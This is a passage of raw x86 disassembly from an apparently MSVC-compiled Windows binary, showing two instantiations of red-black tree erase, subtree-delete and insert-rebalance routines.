   14f30:	mov    ecx,DWORD PTR [ebp+0xc]
   14f33:	cmp    ecx,DWORD PTR [ebp+0x10]
   14f36:	jne    0x14f1a
   14f38:	pop    edi
   14f39:	mov    eax,DWORD PTR [ebp+0x8]
   14f3c:	mov    DWORD PTR [eax],ecx
   14f3e:	pop    esi
   14f3f:	leave  
   14f40:	ret    0xc
   14f43:	int3   
   14f44:	int3   
   14f45:	int3   
   14f46:	int3   
   14f47:	int3   
   14f48:	mov    edi,edi
   14f4a:	push   ebp
   14f4b:	mov    ebp,esp
   14f4d:	push   ecx
   14f4e:	push   ecx
   14f4f:	push   ebx
   14f50:	push   esi
   14f51:	mov    DWORD PTR [ebp-0x4],ecx
   14f54:	push   edi
   14f55:	mov    edi,DWORD PTR [ebp+0xc]
   14f58:	lea    ecx,[ebp+0xc]
   14f5b:	call   0x12ec0
   14f60:	mov    esi,DWORD PTR [edi]
   14f62:	mov    eax,ds:0x7f6d0
   14f67:	mov    ebx,edi
   14f69:	mov    DWORD PTR [ebp-0x8],esi
   14f6c:	cmp    esi,eax
   14f6e:	jne    0x14f8c
   14f70:	mov    esi,DWORD PTR [edi+0x8]
   14f73:	mov    eax,DWORD PTR [ebx+0x4]
   14f76:	mov    ecx,DWORD PTR [ebp-0x4]
   14f79:	mov    DWORD PTR [esi+0x4],eax
   14f7c:	mov    eax,DWORD PTR [ecx+0x4]
   14f7f:	cmp    DWORD PTR [eax+0x4],edi
   14f82:	jne    0x15001
   14f84:	mov    DWORD PTR [eax+0x4],esi
   14f87:	jmp    0x1500f
   14f8c:	mov    ecx,DWORD PTR [edi+0x8]
   14f8f:	cmp    ecx,eax
   14f91:	je     0x14f73
   14f93:	push   ecx
   14f94:	call   0x11286
   14f99:	mov    ebx,eax
   14f9b:	mov    esi,DWORD PTR [ebx+0x8]
   14f9e:	cmp    ebx,edi
   14fa0:	je     0x14f73
   14fa2:	mov    eax,DWORD PTR [ebp-0x8]
   14fa5:	mov    DWORD PTR [eax+0x4],ebx
   14fa8:	mov    eax,DWORD PTR [edi]
   14faa:	mov    DWORD PTR [ebx],eax
   14fac:	cmp    ebx,DWORD PTR [edi+0x8]
   14faf:	jne    0x14fb6
   14fb1:	mov    DWORD PTR [esi+0x4],ebx
   14fb4:	jmp    0x14fcd
   14fb6:	mov    eax,DWORD PTR [ebx+0x4]
   14fb9:	mov    DWORD PTR [esi+0x4],eax
   14fbc:	mov    eax,DWORD PTR [ebx+0x4]
   14fbf:	mov    DWORD PTR [eax],esi
   14fc1:	mov    eax,DWORD PTR [edi+0x8]
   14fc4:	mov    DWORD PTR [ebx+0x8],eax
   14fc7:	mov    eax,DWORD PTR [edi+0x8]
   14fca:	mov    DWORD PTR [eax+0x4],ebx
   14fcd:	mov    eax,DWORD PTR [ebp-0x4]
   14fd0:	mov    eax,DWORD PTR [eax+0x4]
   14fd3:	cmp    DWORD PTR [eax+0x4],edi
   14fd6:	jne    0x14fdd
   14fd8:	mov    DWORD PTR [eax+0x4],ebx
   14fdb:	jmp    0x14feb
   14fdd:	mov    eax,DWORD PTR [edi+0x4]
   14fe0:	cmp    DWORD PTR [eax],edi
   14fe2:	jne    0x14fe8
   14fe4:	mov    DWORD PTR [eax],ebx
   14fe6:	jmp    0x14feb
   14fe8:	mov    DWORD PTR [eax+0x8],ebx
   14feb:	mov    eax,DWORD PTR [edi+0x4]
   14fee:	mov    DWORD PTR [ebx+0x4],eax
   14ff1:	mov    eax,DWORD PTR [ebx+0x70]
   14ff4:	mov    ecx,DWORD PTR [edi+0x70]
   14ff7:	mov    DWORD PTR [ebx+0x70],ecx
   14ffa:	mov    DWORD PTR [edi+0x70],eax
   14ffd:	mov    ebx,edi
   14fff:	jmp    0x15062
   15001:	mov    eax,DWORD PTR [edi+0x4]
   15004:	cmp    DWORD PTR [eax],edi
   15006:	jne    0x1500c
   15008:	mov    DWORD PTR [eax],esi
   1500a:	jmp    0x1500f
   1500c:	mov    DWORD PTR [eax+0x8],esi
   1500f:	mov    eax,DWORD PTR [ecx+0x4]
   15012:	mov    DWORD PTR [ebp-0x8],eax
   15015:	cmp    DWORD PTR [eax],edi
   15017:	jne    0x15039
   15019:	mov    edx,DWORD PTR [edi+0x8]
   1501c:	cmp    edx,DWORD PTR ds:0x7f6d0
   15022:	jne    0x1502b
   15024:	mov    edx,DWORD PTR [edi+0x4]
   15027:	mov    DWORD PTR [eax],edx
   15029:	jmp    0x15039
   1502b:	push   esi
   1502c:	call   0x11286
   15031:	mov    ecx,DWORD PTR [ebp-0x8]
   15034:	mov    DWORD PTR [ecx],eax
   15036:	mov    ecx,DWORD PTR [ebp-0x4]
   15039:	mov    eax,DWORD PTR [ecx+0x4]
   1503c:	mov    DWORD PTR [ebp-0x8],eax
   1503f:	cmp    DWORD PTR [eax+0x8],edi
   15042:	jne    0x15062
   15044:	mov    ecx,DWORD PTR [edi]
   15046:	cmp    ecx,DWORD PTR ds:0x7f6d0
   1504c:	jne    0x15056
   1504e:	mov    ecx,DWORD PTR [edi+0x4]
   15051:	mov    DWORD PTR [eax+0x8],ecx
   15054:	jmp    0x15062
   15056:	push   esi
   15057:	call   0x11264
   1505c:	mov    ecx,DWORD PTR [ebp-0x8]
   1505f:	mov    DWORD PTR [ecx+0x8],eax
   15062:	xor    edi,edi
   15064:	inc    edi
   15065:	cmp    DWORD PTR [ebx+0x70],edi
   15068:	jne    0x1517f
   1506e:	jmp    0x1512d
   15073:	cmp    DWORD PTR [esi+0x70],edi
   15076:	jne    0x1517c
   1507c:	mov    eax,DWORD PTR [esi+0x4]
   1507f:	cmp    esi,DWORD PTR [eax]
   15081:	jne    0x150f8
   15083:	mov    eax,DWORD PTR [eax+0x8]
   15086:	cmp    DWORD PTR [eax+0x70],0x0
   1508a:	jne    0x150a4
   1508c:	mov    DWORD PTR [eax+0x70],edi
   1508f:	mov    eax,DWORD PTR [esi+0x4]
   15092:	and    DWORD PTR [eax+0x70],0x0
   15096:	push   DWORD PTR [esi+0x4]
   15099:	call   0x1304a
   1509e:	mov    eax,DWORD PTR [esi+0x4]
   150a1:	mov    eax,DWORD PTR [eax+0x8]
   150a4:	mov    ecx,DWORD PTR [eax]
   150a6:	cmp    DWORD PTR [ecx+0x70],edi
   150a9:	jne    0x150b3
   150ab:	mov    ecx,DWORD PTR [eax+0x8]
   150ae:	cmp    DWORD PTR [ecx+0x70],edi
   150b1:	je     0x15126
   150b3:	mov    ecx,DWORD PTR [eax+0x8]
   150b6:	cmp    DWORD PTR [ecx+0x70],edi
   150b9:	jne    0x150d3
   150bb:	mov    ecx,DWORD PTR [eax]
   150bd:	mov    DWORD PTR [ecx+0x70],edi
   150c0:	mov    ecx,DWORD PTR [ebp-0x4]
   150c3:	and    DWORD PTR [eax+0x70],0x0
   150c7:	push   eax
   150c8:	call   0x13098
   150cd:	mov    eax,DWORD PTR [esi+0x4]
   150d0:	mov    eax,DWORD PTR [eax+0x8]
   150d3:	mov    ecx,DWORD PTR [esi+0x4]
   150d6:	mov    ecx,DWORD PTR [ecx+0x70]
   150d9:	mov    DWORD PTR [eax+0x70],ecx
   150dc:	mov    ecx,DWORD PTR [esi+0x4]
   150df:	mov    DWORD PTR [ecx+0x70],edi
   150e2:	mov    eax,DWORD PTR [eax+0x8]
   150e5:	mov    ecx,DWORD PTR [ebp-0x4]
   150e8:	mov    DWORD PTR [eax+0x70],edi
   150eb:	push   DWORD PTR [esi+0x4]
   150ee:	call   0x1304a
   150f3:	jmp    0x1517c
   150f8:	mov    eax,DWORD PTR [eax]
   150fa:	cmp    DWORD PTR [eax+0x70],0x0
   150fe:	jne    0x15117
   15100:	mov    DWORD PTR [eax+0x70],edi
   15103:	mov    eax,DWORD PTR [esi+0x4]
   15106:	and    DWORD PTR [eax+0x70],0x0
   1510a:	push   DWORD PTR [esi+0x4]
   1510d:	call   0x13098
   15112:	mov    eax,DWORD PTR [esi+0x4]
   15115:	mov    eax,DWORD PTR [eax]
   15117:	mov    ecx,DWORD PTR [eax+0x8]
   1511a:	cmp    DWORD PTR [ecx+0x70],edi
   1511d:	jne    0x1513e
   1511f:	mov    ecx,DWORD PTR [eax]
   15121:	cmp    DWORD PTR [ecx+0x70],edi
   15124:	jne    0x1513e
   15126:	and    DWORD PTR [eax+0x70],0x0
   1512a:	mov    esi,DWORD PTR [esi+0x4]
   1512d:	mov    ecx,DWORD PTR [ebp-0x4]
   15130:	mov    eax,DWORD PTR [ecx+0x4]
   15133:	cmp    esi,DWORD PTR [eax+0x4]
   15136:	jne    0x15073
   1513c:	jmp    0x1517c
   1513e:	mov    ecx,DWORD PTR [eax]
   15140:	cmp    DWORD PTR [ecx+0x70],edi
   15143:	jne    0x1515d
   15145:	mov    ecx,DWORD PTR [eax+0x8]
   15148:	mov    DWORD PTR [ecx+0x70],edi
   1514b:	mov    ecx,DWORD PTR [ebp-0x4]
   1514e:	and    DWORD PTR [eax+0x70],0x0
   15152:	push   eax
   15153:	call   0x1304a
   15158:	mov    eax,DWORD PTR [esi+0x4]
   1515b:	mov    eax,DWORD PTR [eax]
   1515d:	mov    ecx,DWORD PTR [esi+0x4]
   15160:	mov    ecx,DWORD PTR [ecx+0x70]
   15163:	mov    DWORD PTR [eax+0x70],ecx
   15166:	mov    ecx,DWORD PTR [esi+0x4]
   15169:	mov    DWORD PTR [ecx+0x70],edi
   1516c:	mov    eax,DWORD PTR [eax]
   1516e:	mov    ecx,DWORD PTR [ebp-0x4]
   15171:	mov    DWORD PTR [eax+0x70],edi
   15174:	push   DWORD PTR [esi+0x4]
   15177:	call   0x13098
   1517c:	mov    DWORD PTR [esi+0x70],edi
   1517f:	lea    eax,[ebx+0x10]
   15182:	push   eax
   15183:	call   0x13b00
   15188:	push   ebx
   15189:	call   0x10a9a
   1518e:	mov    eax,DWORD PTR [ebp-0x4]
   15191:	dec    DWORD PTR [eax+0xc]
   15194:	mov    eax,DWORD PTR [ebp+0x8]
   15197:	pop    ecx
   15198:	mov    ecx,DWORD PTR [ebp+0xc]
   1519b:	pop    edi
   1519c:	pop    esi
   1519d:	mov    DWORD PTR [eax],ecx
   1519f:	pop    ebx
   151a0:	leave  
   151a1:	ret    0x8
   151a4:	int3   
   151a5:	int3   
   151a6:	int3   
   151a7:	int3   
   151a8:	int3   
   151a9:	int3   
   151aa:	mov    edi,edi
   151ac:	push   ebp
   151ad:	mov    ebp,esp
   151af:	push   ebx
   151b0:	push   esi
   151b1:	push   edi
   151b2:	mov    edi,DWORD PTR [ebp+0x8]
   151b5:	mov    ebx,ecx
   151b7:	mov    esi,edi
   151b9:	cmp    edi,DWORD PTR ds:0x7f6d0
   151bf:	je     0x151e7
   151c1:	push   DWORD PTR [esi+0x8]
   151c4:	mov    ecx,ebx
   151c6:	call   0x151aa
   151cb:	mov    esi,DWORD PTR [esi]
   151cd:	lea    eax,[edi+0x10]
   151d0:	push   eax
   151d1:	call   0x13b00
   151d6:	push   edi
   151d7:	call   0x10a9a
   151dc:	pop    ecx
   151dd:	mov    edi,esi
   151df:	cmp    esi,DWORD PTR ds:0x7f6d0
   151e5:	jne    0x151c1
   151e7:	pop    edi
   151e8:	pop    esi
   151e9:	pop    ebx
   151ea:	pop    ebp
   151eb:	ret    0x4
   151ee:	int3   
   151ef:	int3   
   151f0:	int3   
   151f1:	int3   
   151f2:	int3   
   151f3:	int3   
   151f4:	mov    edi,edi
   151f6:	push   ebp
   151f7:	mov    ebp,esp
   151f9:	push   ebx
   151fa:	push   esi
   151fb:	mov    esi,DWORD PTR [ebp+0x10]
   151fe:	push   edi
   151ff:	push   0x0
   15201:	push   esi
   15202:	mov    edi,ecx
   15204:	call   0x139c8
   15209:	push   DWORD PTR [ebp+0x14]
   1520c:	mov    ebx,eax
   1520e:	mov    eax,ds:0x7f6d0
   15213:	mov    DWORD PTR [ebx],eax
   15215:	mov    eax,ds:0x7f6d0
   1521a:	mov    DWORD PTR [ebx+0x8],eax
   1521d:	lea    eax,[ebx+0x10]
   15220:	push   eax
   15221:	call   0x13ac4
   15226:	inc    DWORD PTR [edi+0xc]
   15229:	cmp    esi,DWORD PTR [edi+0x4]
   1522c:	je     0x15256
   1522e:	mov    eax,DWORD PTR [ebp+0xc]
   15231:	cmp    eax,DWORD PTR ds:0x7f6d0
   15237:	jne    0x15256
   15239:	lea    eax,[esi+0x10]
   1523c:	push   eax
   1523d:	push   DWORD PTR [ebp+0x14]
   15240:	call   0x197e8
   15245:	test   al,al
   15247:	jne    0x15256
   15249:	mov    DWORD PTR [esi+0x8],ebx
   1524c:	mov    eax,DWORD PTR [edi+0x4]
   1524f:	cmp    esi,DWORD PTR [eax+0x8]
   15252:	jne    0x15270
   15254:	jmp    0x15265
   15256:	mov    DWORD PTR [esi],ebx
   15258:	mov    eax,DWORD PTR [edi+0x4]
   1525b:	cmp    esi,eax
   1525d:	jne    0x1526a
   1525f:	mov    DWORD PTR [eax+0x4],ebx
   15262:	mov    eax,DWORD PTR [edi+0x4]
   15265:	mov    DWORD PTR [eax+0x8],ebx
   15268:	jmp    0x15270
   1526a:	cmp    esi,DWORD PTR [eax]
   1526c:	jne    0x15270
   1526e:	mov    DWORD PTR [eax],ebx
   15270:	mov    eax,DWORD PTR [edi+0x4]
   15273:	mov    esi,ebx
   15275:	cmp    ebx,DWORD PTR [eax+0x4]
   15278:	je     0x1532c
   1527e:	mov    eax,DWORD PTR [esi+0x4]
   15281:	xor    edx,edx
   15283:	cmp    DWORD PTR [eax+0x70],edx
   15286:	jne    0x1532c
   1528c:	mov    ecx,DWORD PTR [eax+0x4]
   1528f:	cmp    eax,DWORD PTR [ecx]
   15291:	jne    0x152cd
   15293:	mov    ecx,DWORD PTR [ecx+0x8]
   15296:	cmp    DWORD PTR [ecx+0x70],edx
   15299:	je     0x152d4
   1529b:	cmp    esi,DWORD PTR [eax+0x8]
   1529e:	jne    0x152aa
   152a0:	mov    esi,eax
   152a2:	push   esi
   152a3:	mov    ecx,edi
   152a5:	call   0x1304a
   152aa:	mov    eax,DWORD PTR [esi+0x4]
   152ad:	mov    DWORD PTR [eax+0x70],0x1
   152b4:	mov    eax,DWORD PTR [esi+0x4]
   152b7:	mov    eax,DWORD PTR [eax+0x4]
   152ba:	and    DWORD PTR [eax+0x70],0x0
   152be:	mov    eax,DWORD PTR [esi+0x4]
   152c1:	push   DWORD PTR [eax+0x4]
   152c4:	mov    ecx,edi
   152c6:	call   0x13098
   152cb:	jmp    0x15320
   152cd:	mov    ecx,DWORD PTR [ecx]
   152cf:	cmp    DWORD PTR [ecx+0x70],edx
   152d2:	jne    0x152f1
   152d4:	mov    edx,eax
   152d6:	xor    eax,eax
   152d8:	inc    eax
   152d9:	mov    DWORD PTR [edx+0x70],eax
   152dc:	mov    DWORD PTR [ecx+0x70],eax
   152df:	mov    eax,DWORD PTR [esi+0x4]
   152e2:	mov    eax,DWORD PTR [eax+0x4]
   152e5:	and    DWORD PTR [eax+0x70],0x0
   152e9:	mov    eax,DWORD PTR [esi+0x4]
   152ec:	mov    esi,DWORD PTR [eax+0x4]
   152ef:	jmp    0x15320
   152f1:	cmp    esi,DWORD PTR [eax]
   152f3:	jne    0x152ff
   152f5:	mov    esi,eax
   152f7:	push   esi
   152f8:	mov    ecx,edi
   152fa:	call   0x13098
   152ff:	mov    eax,DWORD PTR [esi+0x4]
   15302:	mov    DWORD PTR [eax+0x70],0x1
   15309:	mov    eax,DWORD PTR [esi+0x4]
   1530c:	mov    eax,DWORD PTR [eax+0x4]
   1530f:	and    DWORD PTR [eax+0x70],0x0
   15313:	mov    eax,DWORD PTR [esi+0x4]
   15316:	push   DWORD PTR [eax+0x4]
   15319:	mov    ecx,edi
   1531b:	call   0x1304a
   15320:	mov    eax,DWORD PTR [edi+0x4]
   15323:	cmp    esi,DWORD PTR [eax+0x4]
   15326:	jne    0x1527e
   1532c:	mov    eax,DWORD PTR [edi+0x4]
   1532f:	mov    eax,DWORD PTR [eax+0x4]
   15332:	pop    edi
   15333:	mov    DWORD PTR [eax+0x70],0x1
   1533a:	mov    eax,DWORD PTR [ebp+0x8]
   1533d:	pop    esi
   1533e:	mov    DWORD PTR [eax],ebx
   15340:	pop    ebx
   15341:	pop    ebp
   15342:	ret    0x10
   15345:	int3   
   15346:	int3   
   15347:	int3   
   15348:	int3   
   15349:	int3   
   1534a:	mov    edi,edi
   1534c:	push   ebp
   1534d:	mov    ebp,esp
   1534f:	push   ecx
   15350:	push   ecx
   15351:	push   ebx
   15352:	push   esi
   15353:	mov    DWORD PTR [ebp-0x4],ecx
   15356:	push   edi
   15357:	mov    edi,DWORD PTR [ebp+0xc]
   1535a:	lea    ecx,[ebp+0xc]
   1535d:	call   0x1387e
   15362:	mov    esi,DWORD PTR [edi]
   15364:	mov    eax,ds:0x7f6d4
   15369:	mov    ebx,edi
   1536b:	mov    DWORD PTR [ebp-0x8],esi
   1536e:	cmp    esi,eax
   15370:	jne    0x1538e
   15372:	mov    esi,DWORD PTR [edi+0x8]
   15375:	mov    eax,DWORD PTR [ebx+0x4]
   15378:	mov    ecx,DWORD PTR [ebp-0x4]
   1537b:	mov    DWORD PTR [esi+0x4],eax
   1537e:	mov    eax,DWORD PTR [ecx+0x4]
   15381:	cmp    DWORD PTR [eax+0x4],edi
   15384:	jne    0x15403
   15386:	mov    DWORD PTR [eax+0x4],esi
   15389:	jmp    0x15411
   1538e:	mov    ecx,DWORD PTR [edi+0x8]
   15391:	cmp    ecx,eax
   15393:	je     0x15375
   15395:	push   ecx
   15396:	call   0x12d10
   1539b:	mov    ebx,eax
   1539d:	mov    esi,DWORD PTR [ebx+0x8]
   153a0:	cmp    ebx,edi
   153a2:	je     0x15375
   153a4:	mov    eax,DWORD PTR [ebp-0x8]
   153a7:	mov    DWORD PTR [eax+0x4],ebx
   153aa:	mov    eax,DWORD PTR [edi]
   153ac:	mov    DWORD PTR [ebx],eax
   153ae:	cmp    ebx,DWORD PTR [edi+0x8]
   153b1:	jne    0x153b8
   153b3:	mov    DWORD PTR [esi+0x4],ebx
   153b6:	jmp    0x153cf
   153b8:	mov    eax,DWORD PTR [ebx+0x4]
   153bb:	mov    DWORD PTR [esi+0x4],eax
   153be:	mov    eax,DWORD PTR [ebx+0x4]
   153c1:	mov    DWORD PTR [eax],esi
   153c3:	mov    eax,DWORD PTR [edi+0x8]
   153c6:	mov    DWORD PTR [ebx+0x8],eax
   153c9:	mov    eax,DWORD PTR [edi+0x8]
   153cc:	mov    DWORD PTR [eax+0x4],ebx
   153cf:	mov    eax,DWORD PTR [ebp-0x4]
   153d2:	mov    eax,DWORD PTR [eax+0x4]
   153d5:	cmp    DWORD PTR [eax+0x4],edi
   153d8:	jne    0x153df
   153da:	mov    DWORD PTR [eax+0x4],ebx
   153dd:	jmp    0x153ed
   153df:	mov    eax,DWORD PTR [edi+0x4]
   153e2:	cmp    DWORD PTR [eax],edi
   153e4:	jne    0x153ea
   153e6:	mov    DWORD PTR [eax],ebx
   153e8:	jmp    0x153ed
   153ea:	mov    DWORD PTR [eax+0x8],ebx
   153ed:	mov    eax,DWORD PTR [edi+0x4]
   153f0:	mov    DWORD PTR [ebx+0x4],eax
   153f3:	mov    eax,DWORD PTR [ebx+0x68]
   153f6:	mov    ecx,DWORD PTR [edi+0x68]
   153f9:	mov    DWORD PTR [ebx+0x68],ecx
   153fc:	mov    DWORD PTR [edi+0x68],eax
   153ff:	mov    ebx,edi
   15401:	jmp    0x15464
   15403:	mov    eax,DWORD PTR [edi+0x4]
   15406:	cmp    DWORD PTR [eax],edi
   15408:	jne    0x1540e
   1540a:	mov    DWORD PTR [eax],esi
   1540c:	jmp    0x15411
   1540e:	mov    DWORD PTR [eax+0x8],esi
   15411:	mov    eax,DWORD PTR [ecx+0x4]
   15414:	mov    DWORD PTR [ebp-0x8],eax
   15417:	cmp    DWORD PTR [eax],edi
   15419:	jne    0x1543b
   1541b:	mov    edx,DWORD PTR [edi+0x8]
   1541e:	cmp    edx,DWORD PTR ds:0x7f6d4
   15424:	jne    0x1542d
   15426:	mov    edx,DWORD PTR [edi+0x4]
   15429:	mov    DWORD PTR [eax],edx
   1542b:	jmp    0x1543b
   1542d:	push   esi
   1542e:	call   0x12d10
   15433:	mov    ecx,DWORD PTR [ebp-0x8]
   15436:	mov    DWORD PTR [ecx],eax
   15438:	mov    ecx,DWORD PTR [ebp-0x4]
   1543b:	mov    eax,DWORD PTR [ecx+0x4]
   1543e:	mov    DWORD PTR [ebp-0x8],eax
   15441:	cmp    DWORD PTR [eax+0x8],edi
   15444:	jne    0x15464
   15446:	mov    ecx,DWORD PTR [edi]
   15448:	cmp    ecx,DWORD PTR ds:0x7f6d4
   1544e:	jne    0x15458
   15450:	mov    ecx,DWORD PTR [edi+0x4]
   15453:	mov    DWORD PTR [eax+0x8],ecx
   15456:	jmp    0x15464
   15458:	push   esi
   15459:	call   0x1136c
   1545e:	mov    ecx,DWORD PTR [ebp-0x8]
   15461:	mov    DWORD PTR [ecx+0x8],eax
   15464:	xor    edi,edi
   15466:	inc    edi
   15467:	cmp    DWORD PTR [ebx+0x68],edi
   1546a:	jne    0x15581
   15470:	jmp    0x1552f
   15475:	cmp    DWORD PTR [esi+0x68],edi
   15478:	jne    0x1557e
   1547e:	mov    eax,DWORD PTR [esi+0x4]
   15481:	cmp    esi,DWORD PTR [eax]
   15483:	jne    0x154fa
   15485:	mov    eax,DWORD PTR [eax+0x8]
   15488:	cmp    DWORD PTR [eax+0x68],0x0
   1548c:	jne    0x154a6
   1548e:	mov    DWORD PTR [eax+0x68],edi
   15491:	mov    eax,DWORD PTR [esi+0x4]
   15494:	and    DWORD PTR [eax+0x68],0x0
   15498:	push   DWORD PTR [esi+0x4]
   1549b:	call   0x1131e
   154a0:	mov    eax,DWORD PTR [esi+0x4]
   154a3:	mov    eax,DWORD PTR [eax+0x8]
   154a6:	mov    ecx,DWORD PTR [eax]
   154a8:	cmp    DWORD PTR [ecx+0x68],edi
   154ab:	jne    0x154b5
   154ad:	mov    ecx,DWORD PTR [eax+0x8]
   154b0:	cmp    DWORD PTR [ecx+0x68],edi
   154b3:	je     0x15528
   154b5:	mov    ecx,DWORD PTR [eax+0x8]
   154b8:	cmp    DWORD PTR [ecx+0x68],edi
   154bb:	jne    0x154d5
   154bd:	mov    ecx,DWORD PTR [eax]
   154bf:	mov    DWORD PTR [ecx+0x68],edi
   154c2:	mov    ecx,DWORD PTR [ebp-0x4]
   154c5:	and    DWORD PTR [eax+0x68],0x0
   154c9:	push   eax
   154ca:	call   0x1138e
   154cf:	mov    eax,DWORD PTR [esi+0x4]
   154d2:	mov    eax,DWORD PTR [eax+0x8]
   154d5:	mov    ecx,DWORD PTR [esi+0x4]
   154d8:	mov    ecx,DWORD PTR [ecx+0x68]
   154db:	mov    DWORD PTR [eax+0x68],ecx
   154de:	mov    ecx,DWORD PTR [esi+0x4]
   154e1:	mov    DWORD PTR [ecx+0x68],edi
   154e4:	mov    eax,DWORD PTR [eax+0x8]
   154e7:	mov    ecx,DWORD PTR [ebp-0x4]
   154ea:	mov    DWORD PTR [eax+0x68],edi
   154ed:	push   DWORD PTR [esi+0x4]
   154f0:	call   0x1131e
   154f5:	jmp    0x1557e
   154fa:	mov    eax,DWORD PTR [eax]
   154fc:	cmp    DWORD PTR [eax+0x68],0x0
   15500:	jne    0x15519
   15502:	mov    DWORD PTR [eax+0x68],edi
   15505:	mov    eax,DWORD PTR [esi+0x4]
   15508:	and    DWORD PTR [eax+0x68],0x0
   1550c:	push   DWORD PTR [esi+0x4]
   1550f:	call   0x1138e
   15514:	mov    eax,DWORD PTR [esi+0x4]
   15517:	mov    eax,DWORD PTR [eax]
   15519:	mov    ecx,DWORD PTR [eax+0x8]
   1551c:	cmp    DWORD PTR [ecx+0x68],edi
   1551f:	jne    0x15540
   15521:	mov    ecx,DWORD PTR [eax]
   15523:	cmp    DWORD PTR [ecx+0x68],edi
   15526:	jne    0x15540
   15528:	and    DWORD PTR [eax+0x68],0x0
   1552c:	mov    esi,DWORD PTR [esi+0x4]
   1552f:	mov    ecx,DWORD PTR [ebp-0x4]
   15532:	mov    eax,DWORD PTR [ecx+0x4]
   15535:	cmp    esi,DWORD PTR [eax+0x4]
   15538:	jne    0x15475
   1553e:	jmp    0x1557e
   15540:	mov    ecx,DWORD PTR [eax]
   15542:	cmp    DWORD PTR [ecx+0x68],edi
   15545:	jne    0x1555f
   15547:	mov    ecx,DWORD PTR [eax+0x8]
   1554a:	mov    DWORD PTR [ecx+0x68],edi
   1554d:	mov    ecx,DWORD PTR [ebp-0x4]
   15550:	and    DWORD PTR [eax+0x68],0x0
   15554:	push   eax
   15555:	call   0x1131e
   1555a:	mov    eax,DWORD PTR [esi+0x4]
   1555d:	mov    eax,DWORD PTR [eax]
   1555f:	mov    ecx,DWORD PTR [esi+0x4]
   15562:	mov    ecx,DWORD PTR [ecx+0x68]
   15565:	mov    DWORD PTR [eax+0x68],ecx
   15568:	mov    ecx,DWORD PTR [esi+0x4]
   1556b:	mov    DWORD PTR [ecx+0x68],edi
   1556e:	mov    eax,DWORD PTR [eax]
   15570:	mov    ecx,DWORD PTR [ebp-0x4]
   15573:	mov    DWORD PTR [eax+0x68],edi
   15576:	push   DWORD PTR [esi+0x4]
   15579:	call   0x1138e
   1557e:	mov    DWORD PTR [esi+0x68],edi
   15581:	lea    eax,[ebx+0x10]
   15584:	push   eax
   15585:	call   0x13b00
   1558a:	push   ebx
   1558b:	call   0x10a9a
   15590:	mov    eax,DWORD PTR [ebp-0x4]
   15593:	dec    DWORD PTR [eax+0xc]
   15596:	mov    eax,DWORD PTR [ebp+0x8]
   15599:	pop    ecx
   1559a:	mov    ecx,DWORD PTR [ebp+0xc]
   1559d:	pop    edi
   1559e:	pop    esi
   1559f:	mov    DWORD PTR [eax],ecx
   155a1:	pop    ebx
   155a2:	leave  
   155a3:	ret    0x8
   155a6:	int3   
   155a7:	int3   
   155a8:	int3   
   155a9:	int3   
   155aa:	int3   
   155ab:	int3   
   155ac:	mov    edi,edi
   155ae:	push   ebp
   155af:	mov    ebp,esp
   155b1:	push   ebx
   155b2:	push   esi
   155b3:	push   edi
   155b4:	mov    edi,DWORD PTR [ebp+0x8]
   155b7:	mov    ebx,ecx
   155b9:	mov    esi,edi
   155bb:	cmp    edi,DWORD PTR ds:0x7f6d4
   155c1:	je     0x155e9
   155c3:	push   DWORD PTR [esi+0x8]
   155c6:	mov    ecx,ebx
   155c8:	call   0x155ac
   155cd:	mov    esi,DWORD PTR [esi]
   155cf:	lea    eax,[edi+0x10]
   155d2:	push   eax
   155d3:	call   0x13b00
   155d8:	push   edi
   155d9:	call   0x10a9a
   155de:	pop    ecx
   155df:	mov    edi,esi
   155e1:	cmp    esi,DWORD PTR ds:0x7f6d4
   155e7:	jne    0x155c3
   155e9:	pop    edi
   155ea:	pop    esi
   155eb:	pop    ebx
   155ec:	pop    ebp
   155ed:	ret    0x4
   155f0:	int3   
   155f1:	int3   
   155f2:	int3   
   155f3:	int3   
   155f4:	int3   
   155f5:	int3   
   155f6:	mov    edi,edi
   155f8:	push   ebp
   155f9:	mov    ebp,esp
   155fb:	push   ebx
   155fc:	push   esi
   155fd:	mov    esi,DWORD PTR [ebp+0x10]
   15600:	push   edi
   15601:	push   0x0
   15603:	push   esi
   15604:	mov    edi,ecx
   15606:	call   0x13980
   1560b:	push   DWORD PTR [ebp+0x14]
   1560e:	mov    ebx,eax
   15610:	mov    eax,ds:0x7f6d4
   15615:	mov    DWORD PTR [ebx],eax
   15617:	mov    eax,ds:0x7f6d4
   1561c:	mov    DWORD PTR [ebx+0x8],eax
   1561f:	lea    eax,[ebx+0x10]
   15622:	push   eax
   15623:	call   0x13ae2
   15628:	inc    DWORD PTR [edi+0xc]
   1562b:	cmp    esi,DWORD PTR [edi+0x4]
   1562e:	je     0x15658
   15630:	mov    eax,DWORD PTR [ebp+0xc]
   15633:	cmp    eax,DWORD PTR ds:0x7f6d4
   15639:	jne    0x15658
   1563b:	lea    eax,[esi+0x10]
   1563e:	push   eax
   1563f:	push   DWORD PTR [ebp+0x14]
   15642:	call   0x197e8
   15647:	test   al,al
   15649:	jne    0x15658
   1564b:	mov    DWORD PTR [esi+0x8],ebx
   1564e:	mov    eax,DWORD PTR [edi+0x4]
   15651:	cmp    esi,DWORD PTR [eax+0x8]
   15654:	jne    0x15672
   15656:	jmp    0x15667
   15658:	mov    DWORD PTR [esi],ebx
   1565a:	mov    eax,DWORD PTR [edi+0x4]
   1565d:	cmp    esi,eax
   1565f:	jne    0x1566c
   15661:	mov    DWORD PTR [eax+0x4],ebx
   15664:	mov    eax,DWORD PTR [edi+0x4]
   15667:	mov    DWORD PTR [eax+0x8],ebx
   1566a:	jmp    0x15672
   1566c:	cmp    esi,DWORD PTR [eax]
   1566e:	jne    0x15672
   15670:	mov    DWORD PTR [eax],ebx
   15672:	mov    eax,DWORD PTR [edi+0x4]
   15675:	mov    esi,ebx
   15677:	cmp    ebx,DWORD PTR [eax+0x4]
   1567a:	je     0x1572e
   15680:	mov    eax,DWORD PTR [esi+0x4]
   15683:	xor    edx,edx
   15685:	cmp    DWORD PTR [eax+0x68],edx
   15688:	jne    0x1572e
   1568e:	mov    ecx,DWORD PTR [eax+0x4]
   15691:	cmp    eax,DWORD PTR [ecx]
   15693:	jne    0x156cf
   15695:	mov    ecx,DWORD PTR [ecx+0x8]
   15698:	cmp    DWORD PTR [ecx+0x68],edx
   1569b:	je     0x156d6
   1569d:	cmp    esi,DWORD PTR [eax+0x8]
   156a0:	jne    0x156ac
   156a2:	mov    esi,eax
   156a4:	push   esi
   156a5:	mov    ecx,edi
   156a7:	call   0x1131e
   156ac:	mov    eax,DWORD PTR [esi+0x4]
